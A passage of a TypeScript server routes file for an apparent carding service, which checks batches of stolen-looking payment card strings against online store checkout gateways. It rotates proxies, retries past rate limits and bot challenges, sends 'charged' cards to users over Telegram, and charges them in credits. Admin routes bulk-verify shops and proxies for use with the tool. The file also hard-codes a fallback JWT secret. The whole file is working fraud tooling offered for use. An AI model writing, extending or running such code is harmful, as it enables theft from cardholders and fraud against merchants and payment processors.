import type { Express, Request, Response, NextFunction } from "express";
import { type Server } from "http";
import { WebSocketServer, WebSocket } from "ws";
import { storage } from "./storage";
import { api } from "@shared/routes";
import { WS_EVENTS, ADMIN_TELEGRAM_ID } from "@shared/schema";
import { selectAPI, buildCheckUrl } from "./api-config";
import jwt from "jsonwebtoken";
import { telegramService } from "./services/telegram";
import { handleBotUpdate, initBot, sendChargedCardNotification } from "./services/telegramBot";
import { setWss, broadcastToTelegramId } from "./services/wsManager";
import { searchTracks as spotifySearch, getAccessTokenForClient, playTrack as spotifyPlayTrack } from "./services/spotify";
import { generateCaptcha, verifyCaptcha } from "./captcha";
import { checkProxyValidity } from "./proxy-checker";

const JWT_SECRET = process.env.SESSION_SECRET || 'nexus-checker-secret-key-2025';

interface AuthRequest extends Request {
  user?: {
    id: number;
    telegramId: string;
    isAdmin: boolean;
    credits: number;
  };
}

interface UserWebSocket extends WebSocket {
  userId?: number;
  telegramId?: string;
  isAlive?: boolean;
}

export async function registerRoutes(
  httpServer: Server,
  app: Express
): Promise<Server> {

  const wss = new WebSocketServer({ server: httpServer, path: '/ws' });
  setWss(wss);

  const broadcastAll = (data: any) => {
    const payload = JSON.stringify(data);
    wss.clients.forEach((client) => {
      if (client.readyState === WebSocket.OPEN) {
        client.send(payload);
      }
    });
  };

  const broadcastToUser = (userId: number | string, data: any) => {
    const payload = JSON.stringify(data);
    wss.clients.forEach((client) => {
      const userClient = client as UserWebSocket;
      if (userClient.readyState === WebSocket.OPEN) {
        if (userClient.userId === userId || userClient.telegramId === String(userId)) {
          userClient.send(payload);
        }
      }
    });
  };

  wss.on('connection', (ws: UserWebSocket, req) => {
    ws.isAlive = true;
    
    ws.on('pong', () => {
      ws.isAlive = true;
    });

    ws.on('message', async (message) => {
      try {
        const data = JSON.parse(message.toString());
        if (data.type === 'auth' && data.token) {
          const decoded = jwt.verify(data.token, JWT_SECRET) as { telegramId: string; userId: number };
          ws.telegramId = decoded.telegramId;
          ws.userId = decoded.userId;
          ws.send(JSON.stringify({ type: 'auth_success' }));
        }
      } catch (e) {
        // Ignore
      }
    });
  });

  setInterval(() => {
    wss.clients.forEach((ws) => {
      const client = ws as UserWebSocket;
      if (!client.isAlive) {
        return client.terminate();
      }
      client.isAlive = false;
      client.ping();
    });
  }, 30000);

  const getOnlineUsers = async () => {
    const onlineList: Array<{ telegramId: string; userId: number; username: string | null; firstName: string | null; photoUrl: string | null; isAdmin: boolean }> = [];
    const seenIds = new Set<string>();
    const ADMIN_ID = process.env.TELEGRAM_ADMIN_ID || '5197976453';
    
    const clients = Array.from(wss.clients) as UserWebSocket[];
    for (const userClient of clients) {
      if (userClient.readyState === WebSocket.OPEN && userClient.telegramId && !seenIds.has(userClient.telegramId)) {
        seenIds.add(userClient.telegramId);
        const user = await storage.getUserByTelegramId(userClient.telegramId);
        if (user) {
          onlineList.push({
            telegramId: userClient.telegramId,
            userId: user.id,
            username: user.username || null,
            firstName: user.firstName || null,
            photoUrl: user.photoUrl || null,
            isAdmin: userClient.telegramId === ADMIN_ID,
          });
        }
      }
    }
    return onlineList.sort((a, b) => (b.isAdmin ? 1 : 0) - (a.isAdmin ? 1 : 0));
  };

  interface UserJob {
    isRunning: boolean;
    shouldStop: boolean;
    sessionId: string | null;
    processed: number;
    total: number;
    charged: number;
    rejected: number;
    controller: AbortController | null;
  }
  
  const userJobs = new Map<number, UserJob>();
  
  const getUserJob = (userId: number): UserJob => {
    if (!userJobs.has(userId)) {
      userJobs.set(userId, {
        isRunning: false,
        shouldStop: false,
        sessionId: null,
        processed: 0,
        total: 0,
        charged: 0,
        rejected: 0,
        controller: null,
      });
    }
    return userJobs.get(userId)!;
  };

  const killUserProcesses = (userId: number) => {
    const job = getUserJob(userId);
    job.shouldStop = true;
    job.isRunning = false;
    job.sessionId = null;
    job.processed = 0;
    job.total = 0;
    job.charged = 0;
    job.rejected = 0;
    if (job.controller) {
      job.controller.abort();
      job.controller = null;
    }
    broadcastToUser(userId, { type: WS_EVENTS.STATUS_UPDATE, payload: { active: false, processed: 0, total: 0, charged: 0, rejected: 0 } });
    broadcastToUser(userId, { type: WS_EVENTS.LOG, payload: { message: '⛔ Check stopped by user', type: 'info' } });
  };

  const checkCardWithAPI = async (card: string, siteUrl: string, proxy: string, onLog: (msg: string) => void, stopSignal?: AbortSignal, timeoutMs?: number): Promise<{status: string, message: string, price?: string, gateway?: string}> => {
    const cardPrefix = card.substring(0, 6);

    if (stopSignal?.aborted) {
      return { status: 'error', message: '[STOPPED]' };
    }

    onLog(`Checking card ${cardPrefix}...`);

    try {
      // Select API based on proxy usage
      const hasProxy = !!proxy && proxy.trim().length > 0;
      const selectedAPI = selectAPI(hasProxy);
      onLog(`Using API: ${selectedAPI.substring(0, 50)}...`);
      
      // Build URL with proper site protocol
      const url = buildCheckUrl(selectedAPI, card, siteUrl, proxy);
      onLog(`Request: ${url.substring(0, 100)}...`);

      // Combine the stop signal with a 120s hard timeout
      const controller = new AbortController();
      const onStop = () => controller.abort();
      if (stopSignal) {
        stopSignal.addEventListener('abort', onStop, { once: true });
      }
      const timeout = setTimeout(() => controller.abort(), timeoutMs ?? 120000);

      let response: Awaited<ReturnType<typeof fetch>>;
      try {
        response = await fetch(url, { signal: controller.signal });
      } finally {
        clearTimeout(timeout);
        stopSignal?.removeEventListener('abort', onStop);
      }

      if (!response.ok) {
        onLog(`API returned status ${response.status}`);
        return { status: 'error', message: `API Error: ${response.status}` };
      }

      const data = await response.json() as any;
      onLog(`Response: ${JSON.stringify(data).substring(0, 100)}...`);

      const apiMsg = String(data.Response || data.Status || '').toLowerCase();

      // Hard errors: the check itself failed (retryable), not a card decision
      const HARD_ERROR_RE = [
        /exceeded \d+ poll attempts/,
        /could not extract/,
        /step \d+ failed/,
        /inventoryreservationfailure/,
        /cloudflare_challenge/,
        /playwright/,
        /bypass failed/,
        /captcha/,
        /request blocked/,
        /access denied/,
        /connection refused/,
        /bad gateway/,
        /service unavailable/,
        /api error/,
        /internal server error/,
        /ip_rate_limited/,
        /rate_limited/,
        /temporarily unavailable/,
        /timeout/,
      ];
      const isHardError = !apiMsg || HARD_ERROR_RE.some((re) => re.test(apiMsg));

      const DECLINED_RE = [
        /card_declined/,
        /declined/,
        /payments_credit_card_generic/,
        /credit_card_generic/,
      ];
      const isDeclined = !isHardError && DECLINED_RE.some((re) => re.test(apiMsg));

      // Any reply that isn't a decline and isn't a hard error => charged
      let status: string;
      if (isHardError) {
        status = 'error';
      } else if (isDeclined) {
        status = 'dead';
      } else {
        status = 'live';
      }

      return {
        status,
        message: data.Response || data.Status || 'Unknown',
        price: data.Price,
        gateway: data.Gateway,
      };
    } catch (e: any) {
      if (e.name === 'AbortError' || e.name === 'TimeoutError') {
        if (stopSignal?.aborted) {
          return { status: 'error', message: '[STOPPED]' };
        }
        return { status: 'error', message: 'Timeout' };
      }
      return { status: 'error', message: e.message || 'API Error' };
    }
  };

  const isCardExpired = (cardStr: string): boolean => {
    const parts = cardStr.split('|');
    if (parts.length < 3) return false;
    
    let month = parseInt(parts[1], 10);
    let year = parseInt(parts[2], 10);
    
    if (isNaN(month) || isNaN(year)) return false;
    
    if (year < 100) {
      year += 2000;
    }
    
    const now = new Date();
    const currentYear = now.getFullYear();
    const currentMonth = now.getMonth() + 1;
    
    if (year < currentYear) return true;
    if (year === currentYear && month < currentMonth) return true;
    
    return false;
  };

  const processQueue = async (cards: string[], targetUrl: string, proxyListStr: string, userId: number, telegramId: string, sessionId: string, siteId?: number) => {
    const job = getUserJob(userId);
    job.isRunning = true;
    job.shouldStop = false;
    job.sessionId = sessionId;
    job.processed = 0;
    job.total = cards.length;
    job.charged = 0;
    job.rejected = 0;
    job.controller = new AbortController();
    const stopSignal = job.controller.signal;

    const proxies = proxyListStr.split('\n')
      .map(p => p.trim())
      .filter(p => p.length > 0);

    let processedCount = 0;
    let chargedCount = 0;
    let rejectedCount = 0;

    const allCards = cards
      .map(c => c.trim())
      .filter(c => c && c.includes('|'));

    for (let i = allCards.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [allCards[i], allCards[j]] = [allCards[j], allCards[i]];
    }

    const BATCH_SIZE = Math.min(Math.max(Math.ceil(allCards.length / 3), 1), 30);

    broadcastToUser(userId, { type: WS_EVENTS.STATUS_UPDATE, payload: { active: true, processed: 0, total: allCards.length } });
    broadcastToUser(userId, { type: WS_EVENTS.LOG, payload: { message: `Starting check on ${targetUrl}...`, type: 'info' } });
    broadcastToUser(userId, { type: WS_EVENTS.LOG, payload: { message: `${allCards.length} cards | ${proxies.length} proxies | Parallel: ${BATCH_SIZE}`, type: 'info' } });

    for (let i = 0; i < allCards.length; i += BATCH_SIZE) {
      if (job.shouldStop) {
        broadcastToUser(userId, { type: WS_EVENTS.LOG, payload: { message: 'Stopped by user', type: 'info' } });
        break;
      }

      const batch = allCards.slice(i, i + BATCH_SIZE);
      const batchNum = Math.floor(i / BATCH_SIZE) + 1;
      const totalBatches = Math.ceil(allCards.length / BATCH_SIZE);
      
      broadcastToUser(userId, { type: WS_EVENTS.LOG, payload: { message: `Batch ${batchNum}/${totalBatches}...`, type: 'info' } });

      const batchPromises = batch.map(async (cardStr, idx) => {
        if (job.shouldStop) {
          return { success: false, stopped: true, charged: false };
        }

        const proxyIndex = (i + idx) % (proxies.length || 1);

        if (isCardExpired(cardStr)) {
          const saved = await storage.addResult({
            card: cardStr,
            status: 'dead',
            message: 'Expired Card',
            userId: userId,
            sessionId: sessionId,
          });
          
          broadcastToUser(userId, { type: WS_EVENTS.RESULT, payload: saved });
          await storage.updateUserStats(telegramId, 0, 1);
          return { success: true, stopped: false, charged: false };
        }

        // Process valid card with API - retry by error type (temporarily unavailable/timeout max 2x, rate-limited max 4x, others up to 40x)
        try {
          const MAX_ATTEMPTS = 40;
          const RATE_LIMIT_ATTEMPTS = 4;
          const TEMP_ATTEMPTS = 2;
          const retryCap = (msg: string) => {
            const m = msg.toLowerCase();
            if (/ip_rate_limited|rate_limited/.test(m)) return RATE_LIMIT_ATTEMPTS;
            if (/temporarily unavailable|timeout/.test(m)) return TEMP_ATTEMPTS;
            return MAX_ATTEMPTS;
          };
          let attempt = 0;
          let result: Awaited<ReturnType<typeof checkCardWithAPI>> = { status: 'error', message: 'No attempt made' };
          let allowedAttempts = MAX_ATTEMPTS;

          do {
            attempt++;
            if (job.shouldStop) break;
            const attemptProxy = proxies[(proxyIndex + attempt - 1) % (proxies.length || 1)] || '';

            if (attempt > 1) {
              allowedAttempts = retryCap(result.message || '');
              broadcastToUser(userId, { type: WS_EVENTS.LOG, payload: { message: `[${cardStr.substring(0, 6)}] Error - retry ${attempt}/${allowedAttempts} with new proxy...`, type: 'info' } });
              await new Promise(r => setTimeout(r, 300));
            }

            result = await checkCardWithAPI(cardStr, targetUrl, attemptProxy, (msg) => {
              if (job.shouldStop) return;
              broadcastToUser(userId, { type: WS_EVENTS.LOG, payload: { message: `[${cardStr.substring(0, 6)}] ${msg}`, type: 'info' } });
            }, stopSignal);

            allowedAttempts = retryCap(result.message || '');
          } while (result.status === 'error' && attempt < allowedAttempts && !job.shouldStop);

          if (job.shouldStop || result?.message?.includes('[STOPPED]')) {
            return { success: false, stopped: true, charged: false };
          }
          
          let status = 'unknown';
          let isCharged = false;
          
          if (result.status === 'live') {
            status = 'live';
            isCharged = true;
          } else if (result.status === 'dead' || result.status === 'error') {
            status = 'dead';
          }

          const saved = await storage.addResult({
            card: cardStr,
            status: status,
            message: result.message || 'No message',
            userId: userId,
            sessionId: sessionId,
          });

          broadcastToUser(userId, { type: WS_EVENTS.RESULT, payload: saved });

          const currentUser = await storage.getUserByTelegramId(telegramId);
          if (currentUser && !currentUser.isAdmin) {
            const updatedUser = await storage.updateUserCredits(telegramId, -1);
            if (updatedUser) {
              broadcastToUser(userId, { type: WS_EVENTS.CREDITS_UPDATE, payload: { credits: updatedUser.credits } });
            }
          }

          if (result.price && siteId) {
            await storage.updateSitePrice(siteId, result.price);
          }

          if (isCharged) {
            const siteName = siteId 
              ? (await storage.getSiteById(siteId))?.name || targetUrl 
              : targetUrl;
            
            sendChargedCardNotification(telegramId, cardStr, siteName, result.message || 'Charged', {
              brand: result.gateway || 'Unknown',
              type: 'CREDIT',
              country: 'US',
              countryCode: 'US'
            }).catch(console.error);
          }

          return { success: true, stopped: false, charged: isCharged };
        } catch (e: any) {
          if (!job.shouldStop) {
            broadcastToUser(userId, { type: WS_EVENTS.LOG, payload: { message: `Error [${cardStr.substring(0, 6)}]: ${e.message}`, type: 'error' } });
          }
          return { success: false, stopped: job.shouldStop, charged: false };
        }
      });

      const batchResults = await Promise.all(batchPromises);
      
      const actuallyProcessed = batchResults.filter(r => !r.stopped).length;
      const batchCharged = batchResults.filter(r => r.charged).length;
      const batchRejected = actuallyProcessed - batchCharged;
      
      processedCount += actuallyProcessed;
      chargedCount += batchCharged;
      rejectedCount += batchRejected;
      
      job.processed = processedCount;
      job.charged = chargedCount;
      job.rejected = rejectedCount;
      
      if (!job.shouldStop) {
        broadcastToUser(userId, { type: WS_EVENTS.STATUS_UPDATE, payload: { 
          active: true, 
          processed: processedCount, 
          total: allCards.length,
          charged: chargedCount,
          rejected: rejectedCount 
        }});
      }
    }

    await storage.updateUserStats(telegramId, chargedCount, rejectedCount);

    job.isRunning = false;
    job.sessionId = null;
    job.controller = null;
    
    if (!job.shouldStop) {
      broadcastToUser(userId, { type: WS_EVENTS.STATUS_UPDATE, payload: { 
        active: false, 
        processed: processedCount, 
        total: allCards.length,
        charged: chargedCount,
        rejected: rejectedCount
      }});
      broadcastToUser(userId, { type: WS_EVENTS.LOG, payload: { message: `✅ Finished! ${processedCount}/${allCards.length} | Charged: ${chargedCount} | Declined: ${rejectedCount}`, type: 'info' } });
    }
  };

  const authMiddleware = async (req: AuthRequest, res: Response, next: NextFunction) => {
    const authHeader = req.headers['authorization'] as string;
    if (authHeader?.startsWith('Bearer ')) {
      try {
        const token = authHeader.substring(7);
        const decoded = jwt.verify(token, JWT_SECRET) as { telegramId: string; userId: number };
        const user = await storage.getUserByTelegramId(decoded.telegramId);
        if (user) {
          req.user = {
            id: user.id,
            telegramId: user.telegramId,
            isAdmin: user.isAdmin,
            credits: user.credits,
          };
          return next();
        }
      } catch (e) {
        // Token invalid
      }
    }
    
    if (process.env.NODE_ENV === 'development') {
      const telegramId = req.headers['x-telegram-id'] as string;
      if (telegramId) {
        const user = await storage.getUserByTelegramId(telegramId);
        if (user) {
          req.user = {
            id: user.id,
            telegramId: user.telegramId,
            isAdmin: user.isAdmin,
            credits: user.credits,
          };
          return next();
        }
      }
    }
    
    return res.status(401).json({ error: 'Unauthorized' });
  };

  app.post(api.auth.login.path, async (req, res) => {
    try {
      const { initData } = req.body;
      const result = await telegramService.authenticateUser(initData);
      
      if (!result.success || !result.user) {
        return res.status(401).json({ error: result.error });
      }
      
      const token = jwt.sign(
        { telegramId: result.user.telegramId, userId: result.user.id },
        JWT_SECRET,
        { expiresIn: '7d' }
      );
      
      res.json({ user: result.user, token });
    } catch (e: any) {
      res.status(500).json({ error: e.message });
    }
  });

  app.get(api.auth.me.path, authMiddleware, async (req: AuthRequest, res) => {
    const user = await storage.getUserByTelegramId(req.user!.telegramId);
    res.json({ user });
  });

  app.get(api.sites.list.path, authMiddleware, async (req: AuthRequest, res) => {
    const sites = await storage.getUserSites(req.user!.id);
    res.json(sites);
  });

  const normalizeSiteUrl = (raw: string): { url: string; host: string } | { error: string } => {
    let input = (raw || '').trim();
    if (!input) return { error: 'URL is required' };
    if (!/^https?:\/\//i.test(input)) {
      input = 'https://' + input;
    }
    let parsed: URL;
    try {
      parsed = new URL(input);
    } catch {
      return { error: 'Invalid URL' };
    }
    if (!parsed.hostname || !parsed.hostname.includes('.')) {
      return { error: 'Invalid domain' };
    }
    return { url: parsed.origin, host: parsed.hostname };
  };

  const fetchShopDetails = async (origin: string): Promise<{ ok: true; title: string; price: string | null } | { ok: false; error: string }> => {
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 20000);
    try {
      const res = await fetch(`${origin}/products.json`, { signal: controller.signal });
      if (!res.ok) {
        return { ok: false, error: `Store returned HTTP ${res.status}` };
      }
      const data: any = await res.json();
      const products: any[] = Array.isArray(data?.products) ? data.products : [];
      if (products.length === 0) {
        return { ok: false, error: 'No products found on the store' };
      }
      let title: string = products[0]?.title || origin;
      let price: string | null = null;
      for (const product of products.slice(0, 20)) {
        const variants: any[] = Array.isArray(product?.variants) ? product.variants : [];
        for (const variant of variants) {
          const value = parseFloat(variant?.price);
          if (!isNaN(value) && value > 0 && (price === null || value < parseFloat(price))) {
            price = String(variant.price);
            if (product?.title) title = product.title;
          }
        }
      }
      return { ok: true, title, price };
    } catch (e: any) {
      if (e.name === 'AbortError' || e.name === 'TimeoutError') {
        return { ok: false, error: 'Store request timed out' };
      }
      return { ok: false, error: e?.message || 'Failed to reach the store' };
    } finally {
      clearTimeout(timeout);
    }
  };

  // Hit the gateway with a test card; retries up to 5 times on error, rotating proxies
  const testGatewayWithRetries = async (origin: string, proxies: string[], onLog: (msg: string) => void, attemptTimeoutMs: number = 15000) => {
    const testCard = '4111111111111111|12|29|123';
    const MAX_ATTEMPTS = 5;
    let last: Awaited<ReturnType<typeof checkCardWithAPI>> = { status: 'error', message: 'No attempt made' };
    for (let attempt = 1; attempt <= MAX_ATTEMPTS; attempt++) {
      const proxy = proxies.length ? proxies[(attempt - 1) % proxies.length] : '';
      last = await checkCardWithAPI(testCard, origin, proxy, onLog, undefined, attemptTimeoutMs);
      if (last.status !== 'error') {
        return last;
      }
      if (attempt < MAX_ATTEMPTS) {
        onLog(`Gateway attempt ${attempt} error (${last.message}) - retrying (${attempt + 1}/${MAX_ATTEMPTS})...`);
        await new Promise((r) => setTimeout(r, 500));
      }
    }
    return last!;
  };

  const adminProxyList = async (req: AuthRequest, explicit?: string): Promise<string[]> => {
    if (explicit && explicit.trim()) {
      return [explicit.trim()];
    }
    return (await storage.getUserProxies(req.user!.id)).map((p) => p.proxy);
  };

  const buildSiteVerifyResult = async (origin: string, shop: Awaited<ReturnType<typeof fetchShopDetails>>, gateway: Awaited<ReturnType<typeof testGatewayWithRetries>>, started: number) => {
    const gatewayReplied = gateway.status !== 'error' && !!gateway.message && !gateway.message.includes('Timeout') && !gateway.message.includes('[STOPPED]');
    const siteWorks = shop.ok && gatewayReplied;
    return {
      url: origin,
      ok: siteWorks,
      siteWorks,
      productTitle: shop.ok ? shop.title : null,
      productPrice: shop.ok ? shop.price : null,
      siteError: shop.ok ? null : shop.error,
      gateway: gateway.gateway ?? null,
      gatewayReply: gatewayReplied ? gateway.message : null,
      gatewayError: gatewayReplied ? null : gateway.message,
      gatewayStatus: gateway.status,
      gatewayPrice: gateway.price ?? null,
      elapsed: Date.now() - started,
    };
  };

  // Admin: test a site (reaches the gateway with a test card) before adding it as a global site
  app.post('/api/admin/sites/verify', authMiddleware, async (req: AuthRequest, res) => {
    if (!req.user!.isAdmin) {
      return res.status(403).json({ error: 'Admin only' });
    }
    const started = Date.now();
    const normalized = normalizeSiteUrl(req.body?.url);
    if ('error' in normalized) {
      return res.status(400).json({ error: normalized.error });
    }
    const origin = normalized.url;

    const shop = await fetchShopDetails(origin);

    const logs: string[] = [];
    const proxies = await adminProxyList(req, req.body?.proxy);
    const gateway = await testGatewayWithRetries(origin, proxies, (msg) => logs.push(msg));

    const result = await buildSiteVerifyResult(origin, shop, gateway, started);

    res.json({
      ...result,
      logs: logs.slice(0, 30),
    });
  });

  // Admin: bulk verify many sites (up to 1000), one by one, via admin proxy or none
  app.post('/api/admin/sites/verify-bulk', authMiddleware, async (req: AuthRequest, res) => {
    if (!req.user!.isAdmin) {
      return res.status(403).json({ error: 'Admin only' });
    }
    const rawUrls: unknown = req.body?.urls;
    if (!Array.isArray(rawUrls)) {
      return res.status(400).json({ error: 'urls array is required' });
    }

    const normalizedUrls: string[] = [];
    const invalid: Array<{ url: string; error: string }> = [];
    for (const raw of rawUrls.slice(0, 1000)) {
      const input = String(raw ?? '').trim();
      const norm = normalizeSiteUrl(input);
      if ('error' in norm) {
        invalid.push({ url: input || '(empty)', error: norm.error });
      } else {
        normalizedUrls.push(norm.url);
      }
    }

    if (normalizedUrls.length === 0) {
      return res.status(400).json({ error: 'No valid URLs provided', invalid });
    }

    const proxies = await adminProxyList(req, req.body?.proxy);
    const results: any[] = [];
    let workingCount = 0;
    const total = normalizedUrls.length;
    const CONCURRENCY = 12;

    let nextIndex = 0;
    const worker = async () => {
      while (nextIndex < total) {
        const i = nextIndex++;
        if (i >= total) break;
        const origin = normalizedUrls[i];
        const started = Date.now();
        broadcastToUser(req.user!.id, {
          type: WS_EVENTS.LOG,
          payload: { message: `Verifying site ${i + 1}/${total}: ${origin}...`, type: 'info' },
        });

        const shop = await fetchShopDetails(origin);
        const gateway = await testGatewayWithRetries(origin, proxies, () => {}, 15000);
        const result = await buildSiteVerifyResult(origin, shop, gateway, started);
        if (result.siteWorks) {
          workingCount++;
        }
        results[i] = result;

        // Stream each result live so the UI fills in real time
        broadcastToUser(req.user!.id, {
          type: WS_EVENTS.SITE_VERIFY,
          payload: { ...result, progress: { done: i + 1, total } },
        });

        broadcastToUser(req.user!.id, {
          type: WS_EVENTS.LOG,
          payload: {
            message: `Site ${i + 1}/${total}: ${result.siteWorks ? '✅ working' : '❌ failed'} (${result.gatewayReply || result.gatewayError || result.siteError || 'no reply'})`,
            type: result.siteWorks ? 'info' : 'error',
          },
        });
      }
    };

    await Promise.all(Array.from({ length: Math.min(CONCURRENCY, total) }, () => worker()));

    res.json({
      results,
      summary: {
        total,
        working: workingCount,
        failed: results.length - workingCount,
        invalid,
      },
    });
  });

  // Admin: add a global (shared) site that every user can see
  app.post('/api/admin/sites', authMiddleware, async (req: AuthRequest, res) => {
    if (!req.user!.isAdmin) {
      return res.status(403).json({ error: 'Admin only' });
    }
    try {
      const { url, name, productPrice } = req.body;
      const normalized = normalizeSiteUrl(url);
      if ('error' in normalized) {
        return res.status(400).json({ error: normalized.error });
      }
      const displayName = (name || '').trim() || normalized.host;
      const site = await storage.addSite({
        userId: req.user!.id,
        name: displayName,
        url: normalized.url,
        productPrice: productPrice ?? null,
        isActive: false,
        isGlobal: true,
      });
      res.json(site);
    } catch (e: any) {
      res.status(400).json({ error: e.message });
    }
  });

  const assertSiteEditable = async (req: AuthRequest, id: number) => {
    const site = await storage.getSiteById(id);
    if (!site) {
      return undefined;
    }
    if (site.isGlobal) {
      return req.user!.isAdmin ? site : null;
    }
    const userSites = await storage.getUserSites(req.user!.id);
    const ownsSite = userSites.some((s) => s.id === id && s.userId === req.user!.id);
    return ownsSite ? site : null;
  };

  app.post(api.sites.add.path, authMiddleware, async (req: AuthRequest, res) => {
    try {
      const { name, url } = req.body;
      const site = await storage.addSite({
        userId: req.user!.id,
        name,
        url,
        isActive: false,
      });
      res.json(site);
    } catch (e: any) {
      res.status(400).json({ error: e.message });
    }
  });

  app.put('/api/sites/:id', authMiddleware, async (req: AuthRequest, res) => {
    try {
      const id = parseInt(req.params.id as string);
      const target = await assertSiteEditable(req, id);
      if (target === undefined) {
        return res.status(404).json({ error: 'Site not found' });
      }
      if (target === null) {
        return res.status(403).json({ error: 'Access denied' });
      }
      const { name, url } = req.body;
      const site = await storage.updateSite(id, { name, url });
      res.json(site);
    } catch (e: any) {
      res.status(400).json({ error: e.message });
    }
  });

  app.delete('/api/sites/:id', authMiddleware, async (req: AuthRequest, res) => {
    try {
      const id = parseInt(req.params.id as string);
      const target = await assertSiteEditable(req, id);
      if (target === undefined) {
        return res.status(404).json({ error: 'Site not found' });
      }
      if (target === null) {
        return res.status(403).json({ error: 'Access denied' });
      }
      await storage.deleteSite(id);
      res.json({ success: true });
    } catch (e: any) {
      res.status(400).json({ error: e.message });
    }
  });

  app.post('/api/sites/:id/activate', authMiddleware, async (req: AuthRequest, res) => {
    try {
      const siteId = parseInt(req.params.id as string);
      const target = await assertSiteEditable(req, siteId);
      if (target === undefined) {
        return res.status(404).json({ error: 'Site not found' });
      }
      if (target === null) {
        return res.status(403).json({ error: 'Access denied' });
      }
      await storage.setActiveSite(req.user!.id, siteId);
      const site = await storage.getActiveSite(req.user!.id);
      res.json(site);
    } catch (e: any) {
      res.status(400).json({ error: e.message });
    }
  });

  app.get(api.proxies.list.path, authMiddleware, async (req: AuthRequest, res) => {
    const proxies = await storage.getUserProxies(req.user!.id);
    res.json(proxies);
  });

  app.post(api.proxies.add.path, authMiddleware, async (req: AuthRequest, res) => {
    try {
      const { proxies: proxyList } = req.body;
      const added = [];
      for (const raw of (proxyList || []).slice(0, 1000)) {
        const proxy = String(raw ?? '').trim();
        if (proxy) {
          const p = await storage.addProxy({
            userId: req.user!.id,
            proxy,
            isValid: true,
          });
          added.push(p);
        }
      }
      res.json(added);
    } catch (e: any) {
      res.status(400).json({ error: e.message });
    }
  });

  app.post(api.proxies.validate.path, async (req, res) => {
    try {
      const { proxy, proxies: proxyList } = req.body;
      if (Array.isArray(proxyList)) {
        const results = proxyList.slice(0, 1000).map((p: string) => {
          const parts = String(p ?? '').split(':');
          return {
            proxy: String(p ?? ''),
            valid: parts.length >= 2 && parts.length <= 4,
          };
        });
        return res.json({ results, total: results.length, valid: results.filter((r) => r.valid).length });
      }
      const parts = String(proxy ?? '').split(':');
      return res.json({ isValid: parts.length >= 2 && parts.length <= 4 });
    } catch (e: any) {
      res.status(400).json({ error: e.message });
    }
  });

  // Admin: bulk test many proxies (up to 1000) with a concurrency limit
  app.post('/api/proxies/test-bulk', authMiddleware, async (req: AuthRequest, res) => {
    try {
      const rawList: unknown = req.body?.proxies;
      if (!Array.isArray(rawList)) {
        return res.status(400).json({ error: 'proxies array is required' });
      }
      const LIST = rawList.slice(0, 1000).map((p) => String(p ?? '').trim()).filter(Boolean);

      const CONCURRENCY = 20;
      const results: Array<{ proxy: string; valid: boolean; speed?: number; error?: string; ip1?: string }> = [];
      let nextIndex = 0;

      const worker = async () => {
        while (nextIndex < LIST.length) {
          const idx = nextIndex++;
          const proxy = LIST[idx];
          const r = await checkProxyValidity(proxy, 10000);
          results[idx] = {
            proxy,
            valid: r.isValid,
            speed: r.latency,
            error: r.error,
            ip1: r.ip1,
          };
        }
      };

      const workerCount = Math.min(CONCURRENCY, LIST.length);
      await Promise.all(Array.from({ length: workerCount }, () => worker()));

      const working = results.filter((r) => r.valid).length;
      res.json({
        results,
        summary: { total: results.length, working, failed: results.length - working },
      });
    } catch (e: any) {
      res.status(400).json({ error: e.message });
    }
  });

  app.post('/api/proxies/test', authMiddleware, async (req: AuthRequest, res) => {
    try {
      const { proxy } = req.body;
      console.log('[API] Testing proxy:', proxy);
      
      // فحص الـ proxy بشكل حقيقي
      const result = await checkProxyValidity(proxy, 10000);
      
      console.log('[API] Result:', result);
      
      res.json({ 
        valid: result.isValid,
        proxy,
        speed: result.latency,
        responseTime: result.latency,
        type: result.type,
        status: result.isValid ? 'ok' : 'error',
        error: result.error,
        ip1: result.ip1,
        isRotating: false,
        hasAuth: proxy.split(':').length >= 4
      });
    } catch (e: any) {
      console.error('[API] Error:', e);
      res.status(400).json({ error: e.message });
    }
  });

  app.delete('/api/proxies/:id', authMiddleware, async (req: AuthRequest, res) => {
    try {
      const id = parseInt(req.params.id as string);
      const userProxies = await storage.getUserProxies(req.user!.id);
      const ownsProxy = userProxies.some(p => p.id === id);
      if (!ownsProxy) {
        return res.status(403).json({ error: 'Access denied' });
      }
      await storage.deleteProxy(id);
      res.json({ success: true });
    } catch (e: any) {
      res.status(400).json({ error: e.message });
    }
  });

  app.delete(api.proxies.clear.path, authMiddleware, async (req: AuthRequest, res) => {
    try {
      await storage.deleteAllUserProxies(req.user!.id);
      res.json({ success: true });
    } catch (e: any) {
      res.status(400).json({ error: e.message });
    }
  });

  app.post('/api/tutorial/complete', authMiddleware, async (req: AuthRequest, res) => {
    try {
      await storage.markTutorialSeen(req.user!.telegramId);
      res.json({ success: true });
    } catch (e: any) {
      res.status(400).json({ error: e.message });
    }
  });

  app.get(api.credits.balance.path, authMiddleware, async (req: AuthRequest, res) => {
    const user = await storage.getUserByTelegramId(req.user!.telegramId);
    if (!user) {
      return res.status(404).json({ error: 'User not found' });
    }
    res.json({ credits: user.credits });
  });

  app.post(api.credits.add.path, authMiddleware, async (req: AuthRequest, res) => {
    if (!req.user!.isAdmin) {
      return res.status(403).json({ error: 'Admin only' });
    }
    
    try {
      const { telegramId, amount } = req.body;
      const user = await storage.updateUserCredits(telegramId, amount);
      if (!user) {
        return res.status(404).json({ error: 'User not found' });
      }
      
      await storage.addCreditTransaction(user.id, amount, 'admin_add', `Added by admin`, req.user!.telegramId);
      res.json(user);
    } catch (e: any) {
      res.status(400).json({ error: e.message });
    }
  });

  app.get(api.credits.history.path, authMiddleware, async (req: AuthRequest, res) => {
    const user = await storage.getUserByTelegramId(req.user!.telegramId);
    if (!user) {
      return res.status(404).json({ error: 'User not found' });
    }
    
    const history = await storage.getCreditTransactions(user.id);
    res.json(history);
  });

  app.get(api.settings.get.path, authMiddleware, async (req: AuthRequest, res) => {
    try {
      const settings = await storage.getSettings();
      res.json(settings);
    } catch (e: any) {
      res.status(500).json({ error: e.message });
    }
  });

  app.post(api.settings.update.path, authMiddleware, async (req: AuthRequest, res) => {
    if (!req.user!.isAdmin) {
      return res.status(403).json({ error: 'Admin only' });
    }
    
    try {
      const settings = await storage.updateSettings(req.body);
      res.json(settings);
    } catch (e: any) {
      res.status(400).json({ error: e.message });
    }
  });

  app.post(api.check.start.path, authMiddleware, async (req: AuthRequest, res) => {
    try {
      const { cards, siteId } = req.body;
      const cardList = cards;

      // Get the real site URL from the selected site (or the active site)
